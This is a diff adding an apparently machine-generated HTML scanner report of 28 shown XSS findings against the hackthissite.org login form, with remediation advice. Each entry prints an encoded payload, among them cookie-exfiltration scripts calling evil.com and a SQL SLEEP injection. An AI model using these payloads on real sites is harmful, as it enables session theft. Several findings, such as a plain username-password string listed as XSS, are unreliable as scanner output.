@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HSR Advanced v4.0 — Security Report</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
+  .wrap{max-width:1200px;margin:0 auto;padding:20px}
+  h1{color:#58a6ff;padding:20px 0 10px;font-size:1.8rem}
+  h2{color:#8b949e;margin:30px 0 15px;font-size:1.1rem;text-transform:uppercase;letter-spacing:2px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin:20px 0}
+  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;text-align:center}
+  .card .num{font-size:2.4rem;font-weight:700;color:#58a6ff}
+  .badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.8rem;font-weight:700;color:#fff}
+  .vuln-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:10px 0;border-left:4px solid #58a6ff}
+  .vuln-card h3{font-size:1rem;margin-bottom:8px}
+  .row{display:flex;gap:8px;margin:4px 0;font-size:.9rem}
+  .lbl{color:#8b949e;min-width:110px;flex-shrink:0}
+  .code{background:#0d1117;font-family:monospace;padding:8px;border-radius:4px;font-size:.82rem;word-break:break-all;margin-top:6px;border:1px solid #21262d}
+  .rem{background:#0f3428;padding:8px;border-radius:4px;font-size:.85rem;margin-top:6px;color:#3fb950}
+  table{width:100%;border-collapse:collapse;margin:10px 0}
+  th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #21262d;font-size:.9rem}
+  th{color:#58a6ff;background:#161b22}
+  footer{text-align:center;color:#484f58;padding:30px;font-size:.8rem}
+</style>
+</head>
+<body><div class="wrap">
+<h1>🛡 HSR Advanced v4.0 — Security Report</h1>
+<p style="color:#8b949e">Generated: 2026-03-24 21:24:41 &nbsp;|&nbsp; Total findings: <strong style="color:#f0883e">43</strong></p>
+<h2>Overview</h2>
+<div class="grid">
+  <div class="card"><div class="num">43</div><div>Total Findings</div></div>
+  <div class="card"><div class="num" style="color:#cc0000">28</div><div>High</div></div>
+  <div class="card"><div class="num" style="color:#e67e00">15</div><div>Medium</div></div>
+</div>
+<h2>Vulnerability Details</h2>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>1. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %253Cmath%2520href%253Djavascript%253Aalert%25281%2529%253Eclick%253C/math%253E</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>2. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <math href=javascript:alert(1)>click</math>%00</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>3. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <math/**/href=javascript:alert(1)>click</math></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>4. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <math href=javascript:alert(1)>click</math></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>5. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: "><script>alert(1)</script>%00</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>6. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: &#34;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>7. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: "><script>alert(1)</script></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>8. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: IithbGVydCgxKSsi</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>9. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: "+alert(1)+"</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>10. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %22%2b%61%6c%65%72%74%28%31%29%2b%22</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>11. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: &#60;&#105;&#110;&#112;&#117;&#116;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>12. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <input autofocus onfocus=alert(1)> AND SLEEP(5)--</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>13. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <input autofocus onfocus=alert(1)></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>14. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %253Cinput%2520autofocus%2520onfocus%253Dalert%25281%2529%253E</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>15. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %3Cscript%3Efetch%28%27//evil.com%3Fc%3D%27%2Bdocument.cookie%29%3C/script%3E</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>16. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: \u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0063\u006f\u006d\u003f\u0063\u003d\u0027\u002b\u0064\u006f\u0063\u</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>17. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <script>fetch('//evil.com?c='+document.cookie)</script></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>18. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %27%3b%61%6c%65%72%74%28%31%29%3b%2f%2f</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>19. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: ';alert(1);//%00</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>20. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: ';alert(1);//</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>21. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>22. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: javascript%3Aalert%281%29</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>23. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: javascript:alert(1)</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>24. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: %3c%73%76%67%2f%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>25. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: <svg/onload=alert(1)></div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>26. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: &#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>27. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: 1. username='admin'; login_attempt='<script>alert('Login Failed')</script>'</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#cc0000">
+  <h3>28. XSS &nbsp;<span class="badge" style="background:#cc0000">High</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.0</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>username</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Script tag injected, JavaScript protocol handler</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: 2. username='secureuser'; password='password';</div>
+  <div class="rem">💡 Remediation: Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. Reference: OWASP XSS Prevention Cheat Sheet.</div>
+</div>
